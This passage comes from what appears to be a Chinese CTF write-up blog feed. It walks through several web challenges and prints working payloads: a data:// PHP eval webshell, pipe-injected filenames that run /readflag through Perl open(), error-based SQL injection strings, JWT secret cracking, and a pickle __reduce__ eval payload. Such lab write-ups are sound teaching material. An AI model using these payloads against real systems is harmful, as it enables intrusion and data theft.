class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);  <br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];  <br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码首先检查$_SERVER[‘HTTP_X_FORWARDED_FOR’]是否存在，如果存在，则认为这是一个代理IP。然后，它使用explode函数将代理IP字符串（可能是由多个IP组成的，由逗号分隔）分割成数组，并取第一个IP作为$_SERVER[‘REMOTE_ADDR’]的值。这通常用于在反向代理环境中获取原始客户端的IP地址.</p><p>echo $_SERVER[“REMOTE_ADDR”]</p><p>输出客户端的ip地址.</p><hr><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$sandbox = <span class="hljs-string">&quot;sndbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>])<span class="hljs-comment">;  </span><br><span class="hljs-symbol">@mkdir</span>($sandbox)<span class="hljs-comment">;  </span><br><span class="hljs-symbol">@chdir</span>($sandbox)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p> 这里首先根据客户端的IP地址（已经过MD5哈希处理，并附加了”orange”字符串）创建一个沙盒目录名称。然后，使用@mkdir(@用于抑制错误消息)尝试创建这个目录。如果目录成功创建，使用@chdir切换到这个目录.</p><hr><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">$data = shell_exec(<span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> &quot;</span> . escapeshellarg($_GET<span class="hljs-string">[&quot;url&quot;]</span>));<br></code></pre></td></tr></table></figure><p>将执行shell_exec里面的内容(用GET方法去请求url),并赋值给$data.</p><hr><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mel">$info = pathinfo($_GET[<span class="hljs-string">&quot;filename&quot;</span>]);  <br>$dir  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">basename</span>($info[<span class="hljs-string">&quot;dirname&quot;</span>]));  <br>@mkdir($dir);  <br>@chdir($dir);  <br>@file_put_contents(<span class="hljs-keyword">basename</span>($info[<span class="hljs-string">&quot;basename&quot;</span>]), $data);<br></code></pre></td></tr></table></figure><p>通过pathinfo函数解析$_GET[“filename”]，获取其中的目录和文件名，然后，尝试创建一个新的目录（基于目录名，并移除所有点），并切换到该目录中，最后，使用file_put_contents函数尝试将文件保存到目录中，文件名基于$_GET[“filename”]中的基本文件名.</p><p>就是要传入一个url参数和一个filename参数,url参数会被执行get请求,得到后的内容会被写入到 sandbox&#x2F;md5(orange.ip)&#x2F;filename 目录下.</p><hr><p>先去phpstorm中计算出sandbox的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-string">&quot;192.168.122.15&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sandbox</span>;<br><br><span class="hljs-comment">#sandbox/50d5f583d8a911dde39156ba3f03c3d5</span><br></code></pre></td></tr></table></figure><p>首先我们传入</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//e<span class="hljs-number">1</span>db<span class="hljs-number">78</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>-d<span class="hljs-number">10</span>f<span class="hljs-number">-45</span>ac<span class="hljs-number">-827</span><span class="hljs-keyword">c</span><span class="hljs-number">-9</span><span class="hljs-keyword">c</span><span class="hljs-number">60</span>acc<span class="hljs-number">78</span>a<span class="hljs-number">97</span>.node<span class="hljs-number">5</span>.buuoj.cn/?url<span class="hljs-operator">=</span>/&amp;filename<span class="hljs-operator">=</span><span class="hljs-number">1</span><br><br>这里将根目录下的信息写到文件<span class="hljs-number">1</span>中<br></code></pre></td></tr></table></figure><p>访问</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://e1db78c9-d10f-<span class="hljs-number">45</span>ac-<span class="hljs-number">827</span>c-<span class="hljs-number">9</span>c60acc78a97.node5.buuoj.cn/sandbox/<span class="hljs-number">50</span>d5f583d8a911dde39156ba3f03c3d5/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>可以看到根目录下存在一个flag文件和readflag文件</p><hr><h2 id="解法一-SSRF-file伪协议"><a href="#解法一-SSRF-file伪协议" class="headerlink" title="解法一 SSRF&amp;file伪协议"></a>解法一 SSRF&amp;file伪协议</h2><p>构造一个webshell去读取flag，既然这里能执行GET请求并且将响应内容写到文件中，我们可以使用data伪协议来创建一个webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">url=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&amp;filename=1.php</span><br></code></pre></td></tr></table></figure><p>然后用蚁剑连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://e1db78c9-d10f-<span class="hljs-number">45</span>ac-<span class="hljs-number">827</span>c-<span class="hljs-number">9</span>c60acc78a97.node5.buuoj.cn/sandbox/<span class="hljs-number">50</span>d5f583d8a911dde39156ba3f03c3d5/<span class="hljs-number">1</span>.php<br></code></pre></td></tr></table></figure><p>连接成功后点开flag，发现里面是空的，而readflag点开是乱码，推测需要执行</p><p>在根目录下打开终端，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/readflag<br></code></pre></td></tr></table></figure><p>得到flag</p><hr><h2 id="解法二-perl语言漏洞"><a href="#解法二-perl语言漏洞" class="headerlink" title="解法二 perl语言漏洞"></a>解法二 perl语言漏洞</h2><p>因为GET函数在底层调用了perl语言中的open函数，但是该函数存在rce漏洞。当open函数要打开的文件名中存在管道符（并且系统中存在该文件名），就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行.</p><p>首先我们先创建一个同名文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">131</span>cc1e9-<span class="hljs-number">3</span>c92-<span class="hljs-number">4</span>b0c-ac15-<span class="hljs-number">4</span>bc71fff7f9d.node5.buuoj.cn:<span class="hljs-number">81</span>/?url=&amp;filename=|/readflag<br></code></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">131</span>cc1e9-<span class="hljs-number">3</span>c92-<span class="hljs-number">4</span>b0c-ac15-<span class="hljs-number">4</span>bc71fff7f9d.node5.buuoj.cn:<span class="hljs-number">81</span>/?url=file:|/readflag&amp;filename=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>最后访问我们写入了执行结果的文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">131</span>cc1e9-<span class="hljs-number">3</span>c92-<span class="hljs-number">4</span>b0c-ac15-<span class="hljs-number">4</span>bc71fff7f9d.node5.buuoj.cn:<span class="hljs-number">81</span>/sandbox/e51a046f7f8d8c6a6ff47114cd2cd296/<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><p>或者</p><p>2、GET函数底层就是调用了open处理,open函数支持file协议； 可以利用<code>base -c &quot;cmd&quot;</code>进行命令执行<br>先创建文件<code>bash -c /readflag|</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=&amp;filename=bash -c /readflag|<br></code></pre></td></tr></table></figure><p>创建文件后，再通过file协议，将读取的flag放入$data中，通过file_put_contents导入a中。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=file:bash -c /readflag|&amp;<span class="hljs-attribute">filename</span>=a<br></code></pre></td></tr></table></figure><p>然后访问a即可 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sandbox</span>/<span class="hljs-number">50</span>d5f583d8a911dde39156ba3f03c3d5/a<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> ssrf </tag>
            
            <tag> data伪协议 </tag>
            
            <tag> file伪协议 </tag>
            
            <tag> perl语言漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCTF2015-EasySQL</title>
      <link href="/2025/04/02/RCTF2015-EasySQL/"/>
      <url>/2025/04/02/RCTF2015-EasySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="RCTF2015-EasySQL"></a>RCTF2015-EasySQL</h1><p>一打开题目是一个登录界面和注册界面。</p><p>尝试注册username为admin的账号，提交时显示user exists用户已存在。</p><p>但是在登录界面怎么尝试sql注入都没办法，所以只能先注册个合法账号进去看看</p><p>发现有一个change password选项，也就是修改密码</p><p><img src="/../image/RCTF2015-EasySQL-1.png"></p><p>猜测这里存在二次注入。返回注册页面我们这回注册一个这样的账号</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">username</span>:admin&#x27;&quot;)<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>然后再去修改密码页面，点击submit，出现报错信息，并且能够看出这里使用了双引号闭合</p><p>推测修改密码的源代码</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;xxxx&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&quot;xxxx&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../image/RCTF2015-EasySQL-2.png"></p><hr><p>利用fuzz字典爆破username，注意在注册界面进行，查看过滤了哪些关键字</p><p>resoponse为invalid string的关键字是被过滤的关键字，Length为493的关键字为未被过滤的关键字，其中如 and 和 空格这样的关键字都被过滤了，extractvalue和updatexml这样的报错注入关键字未被注释，我们可以利用username进行报错注入了。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">利用报错注入查看数据库的表名<br>admin&quot;||extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(group_concat(table_name))<span class="hljs-keyword">from</span>(information_schema.tables)<span class="hljs-keyword">where</span>(table_schema)=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>))#<br></code></pre></td></tr></table></figure><p>发现三张表</p><p><img src="/../image/RCTF2015-EasySQL-3.png"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">猜测flag在flag表中，查询表flag中的列名<br>admin&quot;||extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)=<span class="hljs-string">&#x27;flag&#x27;</span>)))#<br></code></pre></td></tr></table></figure><p>发现列名flag</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">获取flag的值<br>admin&quot;||extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(flag)<span class="hljs-keyword">from</span>(flag))))#<br></code></pre></td></tr></table></figure><p>发现flag不在这里</p><p><img src="/../image/RCTF2015-EasySQL-4.png"></p><hr><p>相同的步骤访问表users</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&quot;||extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(group_concat(column_name))<span class="hljs-keyword">from</span>(information_schema.columns)<span class="hljs-keyword">where</span>(table_name)=<span class="hljs-string">&#x27;users&#x27;</span>)))#<br></code></pre></td></tr></table></figure><p><img src="/../image/RCTF2015-EasySQL-5.png"></p><p>发现表real_flag_1s_here，但是这里表名没有完全显示，因为<strong>因为 extractvalue 和 updatexml最多只能显示32位数字</strong>，<strong>可以使用 reverse()函数，将报错回显的结果倒置</strong></p><p>然后获取flag</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&quot;||extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(real_flag_1s_here)<span class="hljs-keyword">from</span>(users))))#<br></code></pre></td></tr></table></figure><p><strong>发现查询结果超过1行，我们需要使用正则表达式来获取flag值。</strong></p><p><img src="/../image/RCTF2015-EasySQL-6.png"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&quot;||extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span>(real_flag_1s_here)<span class="hljs-keyword">from</span>(users)<span class="hljs-keyword">where</span>(real_flag_1s_here)regexp(<span class="hljs-string">&#x27;^f&#x27;</span>))))#<br><br>#flag&#123;dd91996a-effb<span class="hljs-number">-485</span><span class="hljs-built_in">e</span>-b30f-ff<br></code></pre></td></tr></table></figure><p>然后还是只能显示32位字符，继续使用reverse函数，将倒置的部分翻转然后和前置部分连接即可</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">admin&quot;||extractvalue(1,concat(0x7e,reverse((<span class="hljs-keyword">select</span>(real_flag_1s_here)<span class="hljs-keyword">from</span>(users)<span class="hljs-keyword">where</span>(real_flag_1s_here)regexp(<span class="hljs-string">&#x27;^f&#x27;</span>)))))#<br><br>#~&#125;<span class="hljs-number">285</span>fc057b8ff-f03b-e584-bffe-a6<br></code></pre></td></tr></table></figure><p>利用sql语句将倒转部分复原</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-keyword">reverse</span>(<span class="hljs-string">&#x27;~&#125;285fc057b8ff-f03b-e584-bffe-a6&#x27;</span>);<br></code></pre></td></tr></table></figure><p>连接不相同部分，得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 二次注入 </tag>
            
            <tag> 报错注入 </tag>
            
            <tag> 正则匹配查询 </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019华北赛区DayWeb2-ikun</title>
      <link href="/2025/04/02/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun/"/>
      <url>/2025/04/02/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN2019华北赛区DayWeb2-ikun"><a href="#CISCN2019华北赛区DayWeb2-ikun" class="headerlink" title="CISCN2019华北赛区DayWeb2-ikun"></a>CISCN2019华北赛区DayWeb2-ikun</h1><p>首先提示我们要找到lv6</p><p><img src="/../image/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun-1.png"></p><p>一页一页翻肯定是不可能的，可以写一个脚本，因为LV等级都是有参数的在网页源码里</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,1000):<br>    <span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28150/shop?page=%d&quot;</span>%(i)<br>    <span class="hljs-attribute">res</span>=requests.get(payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> res.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>     <span class="hljs-built_in">print</span>(i)<br>     break<br></code></pre></td></tr></table></figure><hr><p>发现在181页</p><p>然后购买（需要先注册账户），然后发现买不起只有1000。</p><p>这里抓个包看看，把折扣改以下改成0.0000001</p><p>这里应该是成功了，但是显示只有admin才能访问</p><p><img src="/../image/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun-2.png"></p><p>在抓包的地方发现jwt，这里很容易就能想到是jwt加解密</p><p>在线网站解码<a href="https://jwt.io/">jwt加解密网站</a></p><p><img src="/../image/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADayWeb2-ikun-3.png"></p><p>改成admin尝试登录，发现还是不行，500，服务错误，应该是jwt的密钥不对，导致正常的回显页面没出来</p><p>用解密工具：c-jwt-cracker试着爆破一下</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">c</span>-jwt-cracker - ( https://github.com/brendan-rius/<span class="hljs-keyword">c</span>-jwt-cracker)<br>C-jwt-cracker 是暴力破解 JWT 的私钥的工具。此外，它使用了 JWT 的实现，<span class="hljs-keyword">c</span>-jwt-cracker 使用的 Base<span class="hljs-number">64</span>库被证明是错误的，并且提供了无效的结果。<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">./jwtcrack eyJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiIsInR5</span>cCI<span class="hljs-number">6</span>IkpX<span class="hljs-attr">VCJ9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>I<span class="hljs-symbol">nR0</span>I<span class="hljs-symbol">n0</span>.aT<span class="hljs-number">0</span>YBJFCjWrVH<span class="hljs-number">5</span>uwibrji_<span class="hljs-number">0</span><span class="hljs-symbol">NLf_1</span>SHX<span class="hljs-number">3</span>sf<span class="hljs-symbol">nBz14</span>jmKE<br></code></pre></td></tr></table></figure><p>爆破出来密钥是1Kun</p><p>在加解密工具里把密钥输进去，然后再修改用户admin</p><p>再抓包修改jwt，发现成功访问，然后点点击成为大会员发现没反应，&#x2F;b1g_m4mber页面发现了源码压缩包</p><p>接下来python代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminHandler</span>(<span class="hljs-title class_ inherited__">BaseHandler</span>):<br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.current_user == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;no_ass.html&#x27;</span>)<br><br><span class="hljs-meta">    @tornado.web.authenticated</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        <span class="hljs-keyword">try</span>:<br>            become = <span class="hljs-variable language_">self</span>.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>            p = pickle.loads(urllib.unquote(become))<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=p, member=<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>, res=<span class="hljs-string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="hljs-number">0</span>)<br>关键句是 p = pickle.loads(urllib.unquote(become)<br></code></pre></td></tr></table></figure><p>这里用的是 pickle.loads函数</p><p> 又看到是python2解释器</p><p>python2和python3的print是不一样的，python2中print是语句，但是在python3中print是函数</p><p>python2中的print “” 输出加不加括号都可以</p><p>而 python3中的print(）必须要加括号</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span>）pickle.dump(obj, <span class="hljs-built_in">file</span>, [,protocol])<br>    函数的功能：将obj对象序列化存入已经打开的<span class="hljs-built_in">file</span>中。<br>   参数讲解：<br>obj：想要序列化的obj对象。<span class="hljs-built_in">file</span>:文件名称。<br>protocol：序列化使用的协议。如果该项省略，则默认为<span class="hljs-number">0</span>。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。<br>（<span class="hljs-number">2</span>）pickle.<span class="hljs-built_in">load</span>(<span class="hljs-built_in">file</span>)<br>    函数的功能：将<span class="hljs-built_in">file</span>中的对象序列化读出。    参数讲解：<br><span class="hljs-built_in">file</span>：文件名称。<br>（<span class="hljs-number">3</span>）pickle.dumps(obj[, protocol])<br>   函数的功能：将obj对象序列化为<span class="hljs-keyword">string</span>形式，而不是存入文件中。<br>   参数讲解：<br>obj：想要序列化的obj对象。<br>protocal：如果该项省略，则默认为<span class="hljs-number">0</span>。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。<br>（<span class="hljs-number">4</span>）pickle.loads(<span class="hljs-keyword">string</span>)<br>   函数的功能：从<span class="hljs-keyword">string</span>中读出序列化前的obj对象。<br>   参数讲解：<br><span class="hljs-keyword">string</span>：文件名称。<br></code></pre></td></tr></table></figure><p>那我们的目的明显是读取flag文件，然后利用res输出内容。</p><p>dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br><br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span>(a)<br><br><br>在kali中执行该脚本<br>python2 <span class="hljs-number">1.</span>py<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c__builtin__</span>%<span class="hljs-number">0</span>Aeval%<span class="hljs-number">0</span>Ap0%<span class="hljs-number">0</span>A%<span class="hljs-number">28</span>S%<span class="hljs-number">22</span>open%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>/flag.txt%<span class="hljs-number">27</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>r%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>.read%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">22</span>%<span class="hljs-number">0</span>Ap1%<span class="hljs-number">0</span>Atp2%<span class="hljs-number">0</span>ARp3%<span class="hljs-number">0</span>A. <br></code></pre></td></tr></table></figure><p>抓包添加到隐藏的post传参become后。</p><p>拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> python反序列化 </tag>
            
            <tag> jwt密钥爆破 </tag>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF2019-枯燥的抽奖</title>
      <link href="/2025/04/02/GWCTF2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/"/>
      <url>/2025/04/02/GWCTF2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/</url>
      
        <content type="html"><![CDATA[<p>首先一进去告诉我们要猜测字符串</p><p>查看网页源代码发现一个check.php，打开可以看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#这不是抽奖程序的源代码！不许看！</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">999999999</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;seed&#x27;</span>]);<br><span class="hljs-variable">$str_long1</span> = <span 